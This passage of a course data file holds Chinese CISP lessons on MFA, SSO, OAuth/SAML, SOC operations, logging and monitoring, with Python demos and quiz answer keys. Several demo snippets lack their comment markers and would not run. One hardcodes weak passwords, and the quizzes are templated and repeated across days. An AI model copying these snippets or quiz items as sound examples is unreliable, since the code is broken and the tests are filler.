    content: '# 多因素认证（MFA）\n\n> 📋 **本节大纲**\u2003五大MFA形式(TOTP/HOTP/短信/推送/硬件密钥) | TOTP工作原理 | FIDO2优势\n\n## 概述\n\nMFA（Multi-Factor Authentication）是目前对抗密码泄露最有效的手段。即使你的密码完全泄露，缺少第二个认证因素（手机/令牌/指纹），攻击者也无法登录。MFA可阻止99%的账户盗用攻击。\n\n## 五大MFA形式\n\n**TOTP（基于时间的一次性密码）：**\nGoogle Authenticator、Microsoft Authenticator使用此标准（RFC 6238）。每30秒生成6位数字，基于共享密钥+当前时间计算。不需要网络连接，比短信更安全。\n\n**HOTP（基于计数器的一次性密码）：**\nRFC 4226标准，基于计数器而非时间。每次使用密码计数器+1。问题：如果用户误触生成多个密码而不用，计数不同步。\n\n**短信验证码：**\n最简单也最不安全——SIM卡可被克隆劫持（SIM Swap攻击）。NIST已不推荐短信作为独立MFA方式。但仍有广泛使用。\n\n**推送通知：**\n手机APP弹出"是否允许登录"的确认窗口，用户一键批准。体验最好，安全性依赖于手机锁定状态。\n\n**硬件安全密钥：**\nYubiKey、Titan Security Key等FIDO2/U2F设备。插入USB或NFC触碰即可认证。防钓鱼——密钥绑定到网站域名，不会向钓鱼网站响应。最高安全性级别。\n\n## TOTP工作原理详解\n\n1. 注册时服务器生成随机种子密钥（Secret）并Base32编码\n2. 用户扫描二维码将种子存入手机Authenticator\n3. 登录时：手机用"种子+当前时间戳/30秒"做HMAC-SHA1运算，取最后4字节转换为6位数字\n4. 服务器用相同种子+时间做相同计算，比对是否匹配\n5. 服务器通常允许±1个时间窗口（前后各30秒），防止时钟偏差\n\n## MFA安全考量\n\n- **种子密钥安全存储：**加密存储，泄露=所有TOTP可被伪造\n- **时间同步：**服务器和设备时间需NTP同步\n- **备用恢复码：**设备丢失时使用预先保存的恢复码\n- **防暴力：**TOTP只有6位数字（100万组合），需配合账户锁定\n\n## \n## 🔴 高频考点\n\n· TOTP基于时间(30秒一变)、HOTP基于计数器——区分这两个易混淆概念\n· **SIM Swap**是短信验证码最致命威胁——攻击者克隆SIM卡可接收验证码\n· FIDO2硬件密钥(YubiKey)是最强MFA方案——防钓鱼(密钥绑定网站域名)\n## 💜 记忆口诀\n\n· **TOTP vs HOTP**："T靠时间(Time/30秒)、H靠计数(HMAC/用一次+1)"\n· **安全排行**："短信最弱→APP推送→硬件密钥最强(FIDO2防钓鱼)"\n学习建议\n- TOTP基于时间、HOTP基于计数器——区分清楚\n- SIM Swap是短信验证码最致命的安全威胁\n- FIDO2硬件密钥是目前最强的MFA方案',
    codeExample: { language: 'python', code: 'import time\nimport hmac\nimport base64\nimport struct\n\ndef generate_totp(secret, interval=30):\n    timestamp = int(time.time() // interval)\n    time_bytes = struct.pack(">Q", timestamp)\n    secret_bytes = base64.b32decode(secret)\n    hmac_result = hmac.new(secret_bytes, time_bytes, "sha1").digest()\n    offset = hmac_result[-1] & 0x0f\n    code = struct.unpack(">I", hmac_result[offset:offset+4])[0] & 0x7fffffff\n    return f"{code % 1000000:06d}"\n\n# 测试\nsecret = "JBSWY3DPEHPK3PXP"  # Base32密钥\nprint(f"TOTP: {generate_totp(secret)}")\nprint("(30秒后会变化)")', description: '演示TOTP算法' },
    quiz: [{"id":"q18-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q18-2","question":"以下关于多因素认证（MFA）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q18-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q18-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q18-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-19', day: 19, week: 3, title: '单点登录（SSO）',
    objectives: ['理解SSO概念', '了解SSO协议', '掌握实现原理'],
    content: '# 单点登录（SSO）\n\n> 📋 **本节大纲**\u2003SSO四大协议(SAML/OAuth/OIDC/CAS) | SSO优势与风险 | SAML流程详解 | 协议对比表\n\n## 概述\n\nSSO（Single Sign-On）让用户一次登录后，无需再次输入密码即可访问多个关联系统。比如你用微信登录各种第三方网站就是SSO的典型应用。但SSO是一把双刃剑——虽然方便，但认证中心一旦沦陷则所有系统皆失。\n\n## SSO核心优势\n\n- **用户体验：**一次登录，全天畅通。省去记忆几十个不同密码的痛苦\n- **密码安全性：**用户只需维护一个高强度密码，不再为每个网站重复使用弱密码\n- **统一管理：**管理员在认证中心一处禁用账户，所有系统立即失效（离职回收权限的关键）\n- **降低IT成本：**减少密码重置工单——据统计40%的IT帮助台电话是"忘记密码"\n\n## SSO核心风险与缓解\n\n- **单点故障：**认证中心宕机→所有依赖系统无法登录。缓解：IdP高可用部署（多节点+负载均衡）\n- **账户沦陷影响扩大：**一个密码泄露→攻击者可登录所有系统。缓解：MFA强制绑定\n- **实现复杂：**需要改造所有接入系统支持SSO协议。缓解：选择成熟方案（Keycloak/Auth0）\n\n## 四大SSO协议\n\n### SAML 2.0（安全断言标记语言）\n- 基于XML的企业级标准，支持复杂的联邦认证和属性传递\n- 工作流程：用户访问SP→SP重定向到IdP→用户登录→IdP签发XML断言→返回SP验证\n- 适用：跨组织SSO、传统企业应用\n\n### OAuth 2.0（开放授权）\n- 本质是授权框架而非认证协议，允许第三方应用获取用户资源的访问权限\n- 四种授权模式：授权码（最安全/Web应用）、隐式（SPA）、密码（信任应用）、客户端凭证（服务间）\n- 关键角色：用户(Resource Owner)、第三方应用(Client)、授权服务器、资源服务器\n\n### OpenID Connect (OIDC)\n- 在OAuth 2.0之上添加身份认证层，使用JWT格式的ID Token传递用户信息\n- 现代Web/移动端首选，比SAML更轻量\n\n### CAS（中央认证服务）\n- 开源SSO协议，教育机构广泛使用\n\n## SAML vs OAuth vs OIDC速记\n\n| 协议 | 定位 | 数据格式 | 典型场景 |\n|------|------|---------|---------|\n| SAML | 认证 | XML | 企业SSO |\n| OAuth | 授权 | JSON | API授权 |\n| OIDC | 认证(基于OAuth) | JWT | 现代Web/移动 |\n\n## \n## 🔴 高频考点\n\n· SSO最大挑战：**单点故障(认证中心宕机→全部系统无法登录)+账户联合风险(一密码泄露→全沦陷)**\n· SAML(认证/XML/企业)vs OAuth(授权/JSON/API)vs OIDC(认证+OAuth/JWT/现代)——三重对比必考\n· IdP(身份提供者)和SP(服务提供者)的角色区分\n## 💜 记忆口诀\n\n· **SAML-OAuth-OIDC**："SAML认证XML、OAuth授权JSON、OIDC加身份"\n· **IdP vs SP**："IdP说我证明他是谁、SP说我相信你"\n学习建议\n- SSO最大的安全挑战是"单点故障"和"账户联合风险"\n- SAML和OAuth的本质区别：SAML=认证，OAuth=授权\n- OIDC是OAuth之上的认证层——把OAuth的授权能力拓展到认证',
    codeExample: {
      language: 'python',
      code: ` SSO会话管理模拟\nclass SSOManager:\n    def __init__(self):\n        self.sessions = {}\n    \n    def login(self, username, password):\n        valid_users = {"admin": "admin123", "user": "user123"}\n        if username in valid_users and valid_users[username] == password:\n            session_id = f"session_{len(self.sessions)+1}"\n            self.sessions[session_id] = username\n            return session_id\n        return None\n    \n    def validate(self, session_id):\n        return session_id in self.sessions\n\nsso = SSOManager()\nsid = sso.login("admin", "admin123")\nprint(f"登录成功: {sid}")\nprint(f"验证状态: {sso.validate(sid)}")`,
      description: '演示SSO会话管理',
    },
    quiz: [{"id":"q19-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q19-2","question":"以下关于单点登录（SSO）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q19-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q19-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q19-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-20', day: 20, week: 3, title: 'OAuth与SAML',
    objectives: ['理解OAuth和SAML区别', '了解OAuth流程', '掌握应用场景'],
    content: '# OAuth与SAML\n\n## OAuth 2.0\n\n### 概念\n- 授权框架（注意：不是认证协议）\n- 允许第三方应用访问用户资源\n- 不直接处理用户认证\n\n### 授权类型\n\n1. **授权码模式（Authorization Code）**\n   - 最安全，适用于Web应用\n   - 流程：用户授权→获取授权码→交换令牌\n\n2. **简化模式（Implicit）**\n   - 适用于SPA单页应用\n   - 直接返回访问令牌\n\n3. **密码模式（Password）**\n   - 适用于信任的应用\n   - 用户直接提供密码\n\n4. **客户端凭证模式（Client Credentials）**\n   - 应用间调用\n   - 不涉及用户\n\n### OAuth角色\n- **Resource Owner**：资源所有者（用户）\n- **Client**：客户端（第三方应用）\n- **Authorization Server**：授权服务器\n- **Resource Server**：资源服务器（API）\n\n## SAML 2.0\n\n### 概念\n- 安全断言标记语言\n- 基于XML的协议\n- 专注于身份认证和SSO\n\n### SAML组件\n- **Identity Provider (IdP)**：身份提供者\n- **Service Provider (SP)**：服务提供者\n- **Assertion**：断言（包含用户信息）\n\n### 适用场景\n- 企业级SSO\n- 跨组织认证\n- 安全要求高的场景\n\n## OAuth vs SAML对比\n\n| 特性 | OAuth 2.0 | SAML 2.0 |\n|------|-----------|----------|\n| 类型 | 授权框架 | 认证协议 |\n| 格式 | JSON | XML |\n| 复杂度 | 简单 | 复杂 |\n| 适用 | 互联网、移动 | 企业SSO |\n| 令牌 | JWT、随机字符串 | 断言(XML) |\n\n## OpenID Connect (OIDC)\n- 基于OAuth 2.0的认证层\n- 使用ID Token（JWT格式）\n- 现代应用首选',
    codeExample: {
      language: 'python',
      code: ` OAuth授权流程模拟\nclass OAuthServer:\n    def __init__(self):\n        self.clients = {"app1": {"secret": "secret123"}}\n        self.tokens = {}\n    \n    def get_code(self, client_id):\n        return f"code_{client_id}_{len(self.tokens)}"\n    \n    def exchange_token(self, code):\n        token = f"token_{len(self.tokens)+1}"\n        self.tokens[token] = True\n        return token\n    \n    def validate_token(self, token):\n        return token in self.tokens\n\noauth = OAuthServer()\ncode = oauth.get_code("app1")\ntoken = oauth.exchange_token(code)\nprint(f"授权码: {code}")\nprint(f"访问令牌: {token}")\nprint(f"令牌有效: {oauth.validate_token(token)}")`,
      description: '演示OAuth授权流程',
    },
    quiz: [{"id":"q20-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q20-2","question":"以下关于OAuth与SAML的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q20-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q20-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q20-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-21', day: 21, week: 3, title: '第三周总结与测验',
    objectives: ['回顾第三周知识点', '检验学习成果', '为第四周做准备'],
    content: '# 第三周学习总结\n\n## 本周学习内容\n\n### Day 15: 身份认证基础\n- 认证因素：知识、持有、生物\n- 单因素 vs 多因素\n\n### Day 16: 密码认证技术\n- 密码安全原则\n- 密码哈希存储\n- 盐值作用\n\n### Day 17: 生物识别技术\n- 生理特征 vs 行为特征\n- 优缺点分析\n\n### Day 18: 多因素认证MFA\n- TOTP/HOTP算法\n- 常见MFA形式\n\n### Day 19: 单点登录SSO\n- SSO概念和优缺点\n- SAML、OAuth、OIDC\n\n### Day 20: OAuth与SAML\n- OAuth授权框架\n- SAML认证协议\n- 对比和应用场景\n\n## 知识要点\n\n| 技术 | 核心概念 |\n|------|----------|\n| 密码存储 | 加盐哈希 |\n| TOTP | 30秒+HMAC-SHA1 |\n| SAML | XML/企业SSO |\n| OAuth | JSON/授权框架 |\n| OIDC | OAuth之上的认证层 |\n\n## 下周预告\n\n第四周将学习安全运营：\n- 安全运营中心(SOC)\n- 日志管理\n- 事件响应\n- 安全监控',
    quiz: [{"id":"q21-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q21-2","question":"以下关于第三周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q21-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q21-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q21-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  // ========== Week 4: 安全运营 ==========
  {
    id: 'day-22', day: 22, week: 4, title: '安全运营概述',
    objectives: ['理解安全运营概念', '了解SOC职能', '掌握运营流程'],
    content: '# 安全运营概述\n\n> 📋 **本节大纲**\u2003SOC六大职能 | SOC人员层级L1-L2-L3 | 安全运营五步循环 | 成熟度模型 | MTTD/MTTR\n\n## 概述\n\n安全运营（SecOps）不同于"建设安全"——建设安全是"盖房子"，运营安全是"住房子+巡逻+救火"。安全运营意味着7×24持续监控、发现异常、快速响应、不断改进。SOC是安全运营的实体组织载体。\n\n## SOC安全运营中心\n\nSOC像一个网络安全版的"110指挥中心"——大屏显示实时攻击态势，分析师轮班盯着告警，一旦发现异常立即响应。\n\n### SOC六大核心职能\n1. **实时监控：**7×24不间断收集和分析安全设备（防火墙/IDS/WAF/EDR）的日志和告警\n2. **威胁检测：**从海量告警中识别真正的攻击，区分"真攻击"和"误报"\n3. **事件响应：**发现攻击后按PDCERF流程快速遏制、根除、恢复\n4. **威胁情报：**收集内外部威胁情报（APT组织TTP、最新漏洞利用代码），指导防御\n5. **漏洞管理：**跟踪新漏洞公告，评估影响范围，推动修复\n6. **合规报告：**为等保测评、ISO 27001审计提供安全运营证据\n\n### SOC人员层级（L1→L2→L3）\n- **L1分析师（初级）：**盯着SIEM告警屏幕，初步判断告警是真还是误报。约70%的告警在L1层处理完毕\n- **L2分析师（中级）：**调查L1升级的复杂告警，综合分析多源数据，确定攻击范围和影响\n- **L3专家（高级）：**主动"威胁狩猎"——不等告警，主动在日志中寻找攻击者潜伏的痕迹。还负责开发新的检测规则\n\n### 安全运营五步循环\n**监控**（收集日志）→ **检测**（分析告警）→ **响应**（遏制根除）→ **报告**（事件复盘）→ **改进**（优化规则）→ 回到监控。永远在循环，永远在改进。\n\n### 安全运营成熟度模型\n| 级别 | 特征 |\n|------|------|\n| 初始级 | 无正式流程，出了事再找人 |\n| 可重复级 | 有基本工具（SIEM），有标准流程 |\n| 已定义级 | 完善流程文档+定期培训+演练 |\n| 可管理级 | KPI驱动（MTTD平均检测时间、MTTR平均响应时间）|\n| 持续优化级 | 自动化(SOAR)+AI辅助+持续改进 |\n\n### 核心KPI指标\n- **MTTD（Mean Time to Detect）：**从攻击发生到被发现的平均时间。越短越好\n- **MTTR（Mean Time to Respond）：**从发现到处置完成的平均时间。越短越好\n- **告警准确率：**真阳性告警/总告警数。SOC的"生产力"指标\n\n## \n## 🔴 高频考点\n\n· SOC的L1/L2/L3分析师职责——L1初筛(70%告警)、L2深入调查、L3主动威胁狩猎\n· 评估SOC效能的两大KPI：**MTTD(平均检测时间)和MTTR(平均响应时间)**\n· 安全运营成熟度五级：初始→可重复→已定义→可管理→持续优化\n## 💜 记忆口诀\n\n· **L1-L3**："L1看屏初筛、L2深入调查、L3主动猎"\n· **双指标**："MTTD多久发现(Detection)、MTTR多久解决(Response)"\n学习建议\n- SOC L1/L2/L3的职责划分是CISP考试常见考点\n- MTTD和MTTR是评估SOC效能的核心指标\n- 安全运营是"持续"的——不是一次性的',
    codeExample: {
      language: 'python',
      code: ` 安全事件分类\ndef classify_event(severity, type):\n    levels = {1: "低", 2: "中", 3: "高", 4: "严重"}\n    event_types = {\n        "malware": "恶意软件",\n        "phishing": "钓鱼攻击",\n        "intrusion": "入侵尝试",\n        "data_leak": "数据泄露"\n    }\n    return levels.get(severity, "未知"), event_types.get(type, "其他")\n\n# 模拟事件\nevents = [\n    (3, "phishing"),\n    (4, "data_leak"),\n    (2, "intrusion"),\n]\nfor sev, typ in events:\n    level, name = classify_event(sev, typ)\n    print(f"事件: {name} | 级别: {level}")`,
      description: '演示安全事件分类',
    },
    quiz: [{"id":"q22-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q22-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q22-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q22-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q22-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-23', day: 23, week: 4, title: '日志管理',
    objectives: ['理解日志重要性', '了解日志类型', '掌握日志分析方法'],
    content: '# 日志管理\n\n> 📋 **本节大纲**\u2003四大类日志 | 集中日志方案(ELK/Splunk) | 分析方法(基线/关联/时间线) | 留存要求\n\n## 概述\n\n日志是安全运营的"黑匣子"——攻击者的每一个动作都会在系统中留下痕迹。没有日志，安全事件就成了无头悬案；有了高质量的日志，攻击的全过程可被还原。CISP考试重点考查日志类型、集中收集方案和留存要求。\n\n## 日志的核心价值\n- **事件检测：**从日志中发现异常——多次登录失败=可能暴力破解\n- **事件调查：**安全事件发生后的溯源取证——攻击者何时进入、做了什么、拿了什么\n- **合规审计：**法律法规（网络安全法/等保/GDPR）要求保留日志\n- **故障诊断：**系统和应用问题的排查依据\n\n## 四大类日志\n\n**系统日志：**Windows Event Log（4624登录成功/4625登录失败/4672特权分配）、Linux syslog（/var/log/auth.log认证日志）\n\n**安全日志：**防火墙（拒绝的流量记录）、IDS/IPS（攻击签名匹配）、VPN（连接/断开记录）、EDR（进程创建/网络连接）\n\n**应用日志：**Web服务器（Apache/Nginx access日志含URL/状态码/User-Agent）、数据库（慢查询/错误日志）、自定义应用日志\n\n**网络日志：**DNS查询、DHCP租约（IP→MAC对应关系）、NetFlow流量元数据\n\n## 日志集中管理：Syslog → SIEM\n\n**Syslog协议：**标准的日志传输协议。Facility（日志来源类别）×Severity（严重级别0紧急~7调试）= 分类传输\n\n**ELK Stack：**Elasticsearch（全文搜索）+Logstash（收集范式化）+Kibana（可视化）——开源黄金组合\n\n**Splunk：**商业SIEM平台，强大搜索语言SPL，但价格高昂\n\n## 日志分析法\n- **基线分析：**统计正常时段的访问量、错误率、流量模式→偏离基线即告警\n- **关联分析：**"账号A在3分钟内从3个不同国家IP登录"——单条日志看似正常，关联后暴露异常\n- **时间线还原：**将攻击链按时间排序——"22:00端口扫描→22:05 SSH暴力破解→22:30成功登录→23:00数据外传"\n\n## 日志留存与安全\n- **留存要求：**网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n- **日志安全：**独立日志服务器(管理员不能删除)、WORM存储(一次写入多次读取)、加密传输(TLS)和存储、访问控制(安全审计员专属)\n\n## \n## 🔴 高频考点\n\n· Windows安全事件ID：**4624=登录成功、4625=登录失败**——两个号必须记住\n· 日志留存要求：网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n· **日志不可篡改**是底线——WORM存储+独立日志服务器+加密传输\n## 💜 记忆口诀\n\n· **事件ID**："4624进(登录成功)、4625拒(登录失败)、4672特权"\n· **三重防线**："不可篡改(WORM)、加密传输(TLS)、访问控制(审计员专属)"\n学习建议\n- Windows登录事件ID是最实用的日志分析入门点：4624(成功)/4625(失败)\n- ELK Stack是安全运营的基础设施\n- "日志不可篡改"是日志安全的底线',
    codeExample: {
      language: 'python',
      code: ` 日志分析示例\nimport re\nfrom collections import Counter\n\ndef analyze_access_log(log_lines):\n    ips = []\n    status_codes = []\n    for line in log_lines:\n        # 简单解析Apache日志\n        match = re.match(r"(\\S+).*\\s(\\d{3})\\s\\d+", line)\n        if match:\n            ips.append(match.group(1))\n            status_codes.append(int(match.group(2)))\n    \n    # 统计\n    ip_counts = Counter(ips).most_common(5)\n    status_counts = Counter(status_codes)\n    return ip_counts, status_counts\n\n# 模拟日志\nlogs = [\n    "192.168.1.1 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n    "192.168.1.2 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n]\nips, statuses = analyze_access_log(logs)\nprint(f"TOP IP: {ips}")\nprint(f"状态码: {dict(statuses)}")`,
      description: '演示日志分析',
    },
    quiz: [{"id":"q23-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q23-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q23-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q23-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q23-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-24', day: 24, week: 4, title: '安全监控',
    objectives: ['理解安全监控原理', '了解监控类型', '掌握告警管理'],
    content: '# 安全监控\n\n## 安全监控概念\n\n安全监控是通过技术手段持续监视系统和网络活动，发现安全威胁的过程。\n\n## 监控类型\n\n### 1. 网络监控\n- 流量监控\n- 异常流量检测\n- DDoS攻击检测\n\n### 2. 主机监控\n- 文件完整性监控\n- 进程监控\n- 注册表监控\n\n### 3. 应用监控\n- 登录失败监控\n- API异常调用\n- 权限提升检测\n\n### 4. 数据监控\n- 数据访问异常\n- 大量数据导出\n- 敏感数据访问\n\n## IDS/IPS\n\n### IDS（入侵检测系统）\n- 检测攻击\n- 产生告警\n- 不阻断流量\n- 监控模式：旁路\n\n### IPS（入侵防御系统）\n- 检测并阻断攻击\n- 主动防御\n- 串接部署\n\n### 检测方法\n1. **特征匹配**：已知攻击特征库\n2. **异常检测**：偏离正常基线\n3. **协议分析**：协议异常检测\n\n## SIEM系统\n\n### SIEM（安全信息和事件管理）\n- 收集多源日志\n- 关联分析\n- 统一告警\n- 合规报告\n\n### 主要功能\n- 日志聚合\n- 关联规则\n- 告警管理\n- 仪表板\n- 报告生成\n\n## 告警管理\n\n### 告警处理流程\n1. **接收告警**\n2. **初步分析**\n3. **确认/误报**\n4. **升级/处置**\n5. **关闭/记录**\n\n### 告警优化\n- 减少误报\n- 调整阈值\n- 关联告警\n- 优先级排序',
    codeExample: {
      language: 'python',
